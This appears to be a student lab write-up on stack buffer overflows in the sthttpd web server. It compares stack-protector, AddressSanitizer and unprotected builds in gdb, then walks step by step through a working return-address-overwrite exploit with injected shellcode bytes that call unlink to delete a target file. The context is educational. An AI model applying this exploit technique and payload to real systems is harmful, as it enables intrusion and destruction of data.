# Buffer-Overflow
Using buffer-overflow at the machine level to delete a target file. 

~~~~~~~~~~~
Background
~~~~~~~~~~~

This machine level "hack" lab investigates an old-fashioned way of breaking into systems executing x86 machine code, along 
with a couple of machine-level defenses against this attack. This lab does not give me a toolkit to break in to other 
sites – the method is well-known and ought to be commonly defended against nowadays – but instead, to give a general 
idea of how an attacker can break into a system by exploiting behavior that is undefined at the C level but defined at 
the machine level, and what I can do about it at the machine level.

~~~~~~~~~~~~~
Smashing lab 
~~~~~~~~~~~~~

~~~~~~
Setup
~~~~~~

I began by downloading the tar file from the site and 
using the tar -zxvf command to uncompress it. 
I then used the scp command with the -r flag and made the 
sthttpd-2.27.0 file a directory on the linux09 server. 
I then used the PATH line:

export PATH=/usr/local/cs/bin:$PATH

to make sure my path started with the right location. 
I then ran the build command from the site to build the code:

./configure \ LDFLAGS="-Xlinker --rpath=
/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

I made the compile.sh file that included the above line 
with the make clean and make flag commands and then ran that. 

This created my three files, src/thttpd-sp, src/thttpd-as, 
and src/thttpd-no using the make clean and make commands with flags 
and put them in the src directory as the three names above. 
My given port for each is 

	SP: (12330 + 3 * (504487052 % 293) + 1) = 13045
	AS: (12330 + 3 * (504487052 % 293) + 2) = 13046
	NO: (12330 + 3 * (504487052 % 293) + 3) = 13047

Using the port algorithm above, I made a simple script in Xcode to calculate my three values.

I then made a tester.txt file that contains 'port = AAAA...' (with about 223 A's) that will test the 
three files and make them crash.

I first tested the thttpd-sp with no input or -C flag and the command just hung, doing nothing. This is 
as expected and proves that my web servers are working correctly. 


After testing all three with tester.txt using the commands:

src/thttpd-sp -p 13045 -D -C tester.txt
src/thttpd-as -p 13046 -D -C tester.txt
src/thttpd-no -p 13047 -D -C tester.txt

my outputs were:

src/thttpd-sp: *** stack smashing detected ***: src/thttpd-sp terminated
				Segmentation fault

src/thttpd-as: =================================================================
			   ==20615==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffcfb57f7e4 at pc 0x00000045a408 bp 0x7ffcfb57f740 sp 0x7ffcfb57eef0
			   READ of size 229 at 0x7ffcfb57f7e4 thread T0
               ASAN:SIGSEGV
  	           ==20615==AddressSanitizer: while reporting a bug found another one. Ignoring.

src/thttpd-no: segmentation fault

Therefore, all three crashed as expected.



~~~~~~~~~~~~~~~~~~~~~
Testing of thttpd-sp 
~~~~~~~~~~~~~~~~~~~~~

Then I dove into investigating why thttpd-sp is crashing by running the command:

	src/thttpd-sp -p 13045 -D -C tester.txt

After running this, I got this output:

	*** stack smashing detected ***: src/thttpd-sp terminated
	Segmentation fault

which is perfect as the stack protector strong flag had detected stack smashing. 

I then used gdb to start stepping through the function thttpd-sp. 

I first used the gdb --args src/thttpd-sp -p 13045 -D -C tester.txt command, set logging on, and then 
let it crash. I then used bt to backtrace and it outputted this:

#0  0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6db2029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e50a6 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7650e24 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76e8a57 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76e8a20 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000405022 in read_config (filename=<optimized out>) at thttpd.c:1190
#7  0x4141414141414141 in ?? ()
#8  0x4141414141414141 in ?? ()
#9  0x4141414141414141 in ?? ()
#10 0x4141414141414141 in ?? ()
#11 0x4141414141414141 in ?? ()
#12 0x4141414141414141 in ?? ()
#13 0x4141414141414141 in ?? ()
#14 0x4141414141414141 in ?? ()
#15 0x4141414141414141 in ?? ()
#16 0x0000000000414141 in ?? ()
#17 0x0000000000000000 in ?? ()

The hex 0x41 corresponds to the ascii letter A, which makes sense as my tester.txt contains port = a bunch 
of A's. So the addresses are the hex representation of all my A's in my tester.txt. 


1. I typed gdb --args src/thttpd-sp -p 13045 -D -C tester.txt which started the function in gdb. 
2. I typed set disassemble-next-line on.
3. I then set a breakpoint at read_config by typing break read_config.
4. I typed r for run.

After stepping thought the function read_config, I eventually got to a line that was in a function called ??.

(gdb) 
0x00000000004022c0 in ?? ()
=> 0x00000000004022c0:	ff 35 42 2d 21 00	pushq  0x212d42(%rip)        # 0x615008


This looks very suspicious and could be part of the crash. 

I quickly realized that a canary was being implemented before calling fopen by examining the lines:

   0x0000000000404a34 <+20>:	mov    %fs:0x28,%rax
   0x0000000000404a3d <+29>:	mov    %rax,0x68(%rsp)
   0x0000000000404a42 <+34>:	xor    %eax,%eax

which sets %rax as a special-sentinel stack-guard value 
and putting that %rax onto the stack at 0x68(%rsp) 
before xoring the last 32-bits. I believe that this 
will be the source of the crash, as it may be overwritten 
at some point.

I first tried stepping into each function and running through 
gdb but that proved to be way to long a process as I never 
got to the end. So instead I used step over by typing s and 
stepped over everything until I got the actual stack error:

	*** stack smashing detected ***: /w/home.02/eng/ugrad/alvarezc/sthttpd-2.27.0/src/thttpd-sp terminated

Once I found this, I looked at the lines before the detection and noticed this following line near the end:

	0x0000000000404efd <read_config+1245>:	0f 85 1a 01 00 00	jne    0x40501d <read_config+1533>

which actually checks the canary in %rax. The lines right before this jne:

   0x0000000000404eef <read_config+1231>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
   0x0000000000404ef4 <read_config+1236>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax	

are taking the canary from 0x68(%rsp), putting it into %rax 
and then comparing the initial value of the canary (the initial stack-guard value) 
to the now final value. If the two values aren't equal, the 
jne line takes us to a different function called stack check fail:

	0x000000000040501d <read_config+1533>:	e8 6e d4 ff ff	callq  0x402490 <__stack_chk_fail@plt>

which is exactly what happened. I found this stack check 
fail by stepping into, rather than over, the jne line. 
This tells us that the canary was changed, which is what 
invoked the crash. Once stack check fail returns, the error 
is outputted and the function crashes.  

Therefore the jne line which checks the canary:

	0x0000000000404efd <read_config+1245>:	0f 85 1a 01 00 00	jne    0x40501d <read_config+1533>

caused the crash.



~~~~~~~~~~~~~~~~~~~~~
Testing of thttpd-as 
~~~~~~~~~~~~~~~~~~~~~

To start testing of thttpd-as I did the same first step as for thttpd-sp. I ran a backtrace once running 
it in gdb and the output was:  


#0  0x00007ffff7073128 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7074029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x000000000048a406 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffbc70, pc=4563976, 
    max_depth=<optimized out>)
    at ../../../../gcc-5.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_posix_libcdep.cc:113
#3  0x0000000000486882 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342320, 
    pc=<optimized out>, max_depth=256, stack=<optimized out>)
    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_stack.h:43
#4  __asan_report_error (pc=<optimized out>, bp=bp@entry=140737488342320, sp=sp@entry=140737488340192, 
    addr=addr@entry=140737488342484, is_write=is_write@entry=0, access_size=access_size@entry=229)
    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_report.cc:1006
#5  0x000000000045a423 in __interceptor_strchr (str=str@entry=0x7fffffffcd70 "port=", 'A' <repeats 195 times>..., 
    c=c@entry=35) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430
#6  0x00000000004b1df1 in read_config (filename=<optimized out>) at thttpd.c:1018
#7  0x4141414141414141 in ?? ()
#8  0x00007f000a414141 in ?? ()
#9  0x00007fffffffe0f0 in ?? ()
#10 0x00007fffffffe4d1 in ?? ()
#11 0x00007fffffffd010 in ?? ()
#12 0x0000000000000006 in ?? ()
#13 0x00000000004082b8 in main (argc=1094795585, argv=<optimized out>) at thttpd.c:380


I then stepped through the read_config function using s and I eventually got to this line:

	0x000000000045a41e <__interceptor_strchr(char const*, int)+238>:	
    e8 3d c1 02 00	callq  0x486560 <__asan_report_error(__sanitizer::uptr, __sanitizer::uptr, __sanitizer::uptr, __sanitizer::uptr, int, __sanitizer::uptr)>

which calls a function called asan report error. 
After this is called, the function begins to just loop 
itself inside a function called asan_region_is_poisoned. 
(this relates to the AdressSanitizer link in the spec) 
At this point the function is crashed as this poisoned 
function just repeats forever. But as for the line that 
causes the crash, I want to find the line that 
calls interceptor_strchr, the function shown in the 
above line of code. I then backtracked and found this line below:

	0x00000000004b1dec <read_config+188>:	e8 3f 85 fa ff	callq  0x45a330 <__interceptor_strchr(char const*, int)>

which is the last read_config line that executes before the 
function crashes. This line calls interceptor_strchr which 
is what invokes the crash as it detects something is off in 
the buffer. (asan region is poisoned) 



~~~~~~~~~~~~~~~~~~~~~
Testing of thttpd-no 
~~~~~~~~~~~~~~~~~~~~~

I performed the same first steps as the first two. My backtrace output was:

#0  0x0000000000404d6b in read_config (filename=<optimized out>) at thttpd.c:1190
#1  0x4141414141414141 in ?? ()
#2  0x4141414141414141 in ?? ()
#3  0x4141414141414141 in ?? ()
#4  0x4141414141414141 in ?? ()
#5  0x4141414141414141 in ?? ()
#6  0x4141414141414141 in ?? ()
#7  0x4141414141414141 in ?? ()
#8  0x4141414141414141 in ?? ()
#9  0x4141414141414141 in ?? ()
#10 0x0000000000414141 in ?? ()
#11 0x0000000000000000 in ?? ()

I then stepped through the function using s and got to the very last line:

	0x0000000000404d6b <read_config+1227>:	c3	retq 

After executing this line, the segmentation fault occurs, 
telling us that the return address has been overwritten. 
This happens because read_config tries to return 
to address 0x4141414141414141, which is what it is 
because of my 223 A's. When this address goes to 
somewhere random, a segmentation fault occurs. 
Because NO is run with no protector flags, (no sanitation or stack protecter) 
the code does a classic crash due to 
a overwritten return address of read_config.



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Generating the Assembly Code
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To make the three .s files I did it by hand:

make clean
make CFLAGS=' -S -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd.o src/thttpd-sp.s

make clean
make CFLAGS=' -S -O2 -static-libasan -fno-inline -fsanitize=address'
mv src/thttpd.o src/thttpd-as.s

make clean
make CFLAGS=' -S -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd.o src/thttpd-no.s


I then scp-ed each .s file onto my local computer 
so that I could compare the handle_read functions 
from each in their own .txt file. 
After placing each handle_read into their .txt files 
I used the diff linux command to compare two files 
at a time and see the differences. I began by comparing SP and NO:

	diff -u handlereadSP.txt handlereadNO.txt > diffSPNO.txt  (puts the differences in a txt file called diffSPNO.txt)

After examining the different pluses and minuses, 
the two functions were practically identical. 
The only thing I noticed that was different were 
the jumps labels. Everything else was pretty much the same. 
The reason why these two are basically the same 
is because -fstack-protector-strong will only guard 
any function that declares any type or length of local 
array, even those in structs or unions. (This is from the  
"Strong" stack protection for GCC link in the spec) In handle_read, no 
declaration of a local array occurs, meaning that 
that flag is virtually invisible in handle_read. 
Therefore, because thttpd-no has no stack protection 
whatsoever, the two functions look the same.

Next, I compared SP/NO with AS, as SP and NO are 
essentially the same now. AS is substantially 
different then the other two which is expected as 
it utilizes an address sanitation system rather then 
a stack protector one. According to Wikipedia, 
address sanitation or shadow memory is a technique 
used to track and store information on computer memory 
used by a program during its execution. The reason why 
the handle_read of AS is so much longer is because 
address sanitation checks shadow memory throughout 
the function and executes extra functions, like asan_report_error 
for example, if anything is detected to be not as expected. 


In conclusion, address sanitation is more thorough 
but slower, while stack protector is less thorough 
and more efficient/faster.

   

~~~~~~~~~~~~~~~~~~~~
Building an Exploit 
~~~~~~~~~~~~~~~~~~~~

The goal of the exploit is to make my thttpd-no 
delete a file by injecting the instructions to do 
so into the stack. Now, because the thttpd-no file 
was compiled with the zexecstack flag, the nx bit 
is disabled and I can execute in the stack itself 
by injecting raw code into it. If I modify my tester.txt 
file so that I have enough garbage (A's) to reach the 
return address of read_config, then I can replace the 
return address with an address that leads to my malicious code.    

To setup the exploit, I created target.txt and put it in 
my working directory of my server file. I then created 
an exploit.txt file and imported my current tester.txt 
contents into it using the cat command. 


1. My first step was to find how many "columns" it 
would take to reach the return address of read_config 
and cause segmentation fault in the thttpd-no file. 
I know that the return address will definitely be 
between start_of_buffer + 100 and start_of_buffer + 1000. 
After slowly deleting A's from exploit.txt until the program 
didn't crash, I found that, including the "port=", the 
max number of columns that would not cause segmentation 
fault was 152. So I kept that amount of A's - "port=" as 
garbage, which would allow for the following code to overwrite 
the return address. From there I could input my address that 
led to the code that would delete the target.txt file. 

2. The next step was to get the actual address of the the start of the buffer. The start of my buffer was at address:

	0x7fffffffcec0

I got this by running my thttpd-no executable in gdb, setting 
a break at read_config, running it, and then using the print (int *)line 
when I got to the fgets function, as fgets actually uses a path 
to the exploit.txt file. Steps shown below:

1. gdb --args src/thttpd-no -p 13047 -D -C exploit.txt
2. break read_config
3. run
4. step through read_config until fgets is called
5. print (int *)line (when fgets function appears)

3. Next I added 152 to the above address to get the address of the return address of read_config. 

	0x7fffffffcec0 + 0x98 (152 in hex) = 0x7fffffffcf58. 


4. The above address is the address I need to overwrite with 
a new one that points to my malicious code. I decided to use 
the address right after the return address to inject my code. 
So that address is the return address + 8, as the return address is 8 bytes:

	0x7fffffffcec0 + 0xa0 (160 in hex) = 0x7fffffffcf60

This is the first bit of code for my malicious code as it 
takes the compiler to the rest of my injected code. So I had 
to convert that address to bytes and then to raw code. I know 
that to convert an address to byte code you just have to 
put spaces in between each byte so that was relatively easy. 
But I also had to reverse the address as we are using a 
little-endian machine. I also have to pad my address with 
2 bytes of zeros because the above address is only 6 bytes long. 
With this address, I can begin making my malicious code:

	  60 cf ff ff ff 7f 00 00


5. My next step was to find the byte sequence for the remove 
function so that I could convert it into raw code and put that 
in my exploit.txt at the right place. I found a simple function 
that used the remove function on the Internet:

- #include <stdio.h>
- #include <string.h>

int main()
{
        
        int ret;
        FILE *fp;
        char filename[] = "file.txt";

        fp = fopen(filename, "w");
        fclose(fp);

        ret = remove(filename);  <- remove is here

        return(0);
}

and ran it in gdb while setting a break at remove and stepping into each function. My output is shown below:

0x00007ffff7a83750 <remove+0>:	53	push   %rbx
0x00007ffff7a83751 <remove+1>:	48 89 fb	mov    %rdi,%rbx
0x00007ffff7a83754 <remove+4>:	e8 57 f9 07 00	callq  0x7ffff7b030b0 <unlink>
0x00007ffff7b030b0 <unlink+0>:	b8 57 00 00 00	mov    $0x57,%eax
0x00007ffff7b030b5 <unlink+5>:	0f 05	syscall 
0x00007ffff7b030b7 <unlink+7>:	48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
0x00007ffff7b030bd <unlink+13>:	73 01	jae    0x7ffff7b030c0 <unlink+16>
0x00007ffff7b030bf <unlink+15>:	c3	retq   
0x00007ffff7a83759 <remove+9>:	85 c0	test   %eax,%eax
0x00007ffff7a8375b <remove+11>:	74 24	je     0x7ffff7a83781 <remove+49>
0x00007ffff7a83781 <remove+49>:	5b	pop    %rbx
0x00007ffff7a83782 <remove+50>:	c3	retq    

The unlink byte code is the code I want to use as the 
unlink function actually deletes the file. From piazza, I 
knew that the syscall on line 5 was what I needed to get 
the byte code for. After searching syscall on the Internet 
I learned that I also needed to move the value 87 (0x57 in hex) 
to the rax register so that syscall is defined and can execute properly:

	#define __NR_unlink   87

This can be seen in the gdb code above on line 4 before the syscall. 

	0x00007ffff7b030b0 <unlink+0>:	b8 57 00 00 00	mov    $0x57,%eax

These two lines of byte code make up another part of my malicious code in exploit.txt:

	b8 57 00 00 00 0f 05	 

At first I thought this code would go right after my malicious 
address above but I quickly realized that I had to move the 
address of my target file (the file I wanted to delete) into 
the rdi register first in order for unlink to work on the right file. 

6. Finding the byte code to move target.txt into the rdi register 
was my next step. To do this I had to find the address of where 
target.txt is going to be. I am going to put target.txt after my 
malicious code so I need to see how many bytes my malicious code 
is and use that to determine the address of target.txt. 
Because I need the target address to finish my malicious code, I 
decided to for now use the byte code for moving the address of the 
end of the return address to rdi as a place holder. This way I can 
see how many bytes my malicious code will take up, thus allowing me 
to replace the end of the return address in the move to the actual address of target.txt.  

To do this I created a file called inst.s and put my move into it, shown below:

	mov $0x7fffffffcf60, %rdi

The address above is obviously not right yet but I am using it as a place holder to find what the address of target will be. I then compiled the file using the command:

gcc -c inst.s

This gave me a .o file that I could use objdump on. I then used objdump to get the byte code for the move:

objdump -d inst.o

The output is below:

0000000000000000 <.text>:
   0:	48 bf 60 cf ff ff ff 	movabs $0x7fffffffcf60,%rdi
   7:	7f 00 00 

After taking the byte code and adding it to my malicious code before the syscall, I had this:

	60 cf ff ff ff 7f 00 00 48 bf 60 cf ff ff ff 7f 00 00 b8 57 00 00 00 0f 05

Looking at the above bytes, if we don't include the bytes 
replacing the return address, target.txt will be placed 17 bytes 
after the end of the return address and 177 after the start of 
the buffer. Now that I know this, I can get the correct address 
of target.txt by adding 17 to the return address. 
	
	0x7fffffffcf60 + 0x11 (17 in hex) = 0x7fffffffcf71

Replacing mov $0x7fffffffcf60, %rdi with mov $0x7fffffffcf71, %rdi my objdump output was:

	0000000000000000 <.text>:
   0:	48 bf 71 cf ff ff ff 	movabs $0x7fffffffcf71,%rdi
   7:	7f 00 00 

I then updated my malicious byte code:

	60 cf ff ff ff 7f 00 00 48 bf 71 cf ff ff ff 7f 00 00 b8 57 00 00 00 0f 05

7. My next step was to convert the file name target.txt into 
byte code before appending it to the end of my malicious byte code. 
To do this I looked up an ASCII table and converted each letter to byte code:

	74 61 72 67 65 74 2E 74 78 74 00

I also added a null byte at the end (00) to show that the file 
name is done. During my tests, the exploit was not working due 
to lack of a null byte. Appending this to the end of my malicious 
code, I now have:

	60 cf ff ff ff 7f 00 00 48 bf 71 cf ff ff ff 7f 00 00 b8 57 00 00 00 0f 05 74 61 72 67 65 74 2E 74 78 74 00


8. My final step was to convert the above bytes to raw code and 
then append that to my exploit.txt file so that everything is 
lined up accordingly. I used the hex2raw executable to do this. 
At first it didn't work but I realized I needed to do chmod +777 
to change the permissions of the file. My raw code was this:

    `Ïÿÿÿ^?^@^@H¿qÏÿÿÿ^?^@^@¸W^@^@^@^O^Etarget.txt^@


After converting, I appended the above code into exploit.txt which 
as of now contains port=AAAA.... The A's are of course garbage that 
allows the raw code to overwrite the return address. 


After appending the raw code to exploit.txt, I ran the thttpd-no executable with exploit.txt in gdb and my target.txt file was deleted. 

1. gdb --args src/thttpd-no -p 13047 -D -C exploit.txt
2. run
3. quit
4. Target.txt is nowhere to be found.

We are done.

My exploit.txt file is also included in my submission. 


	
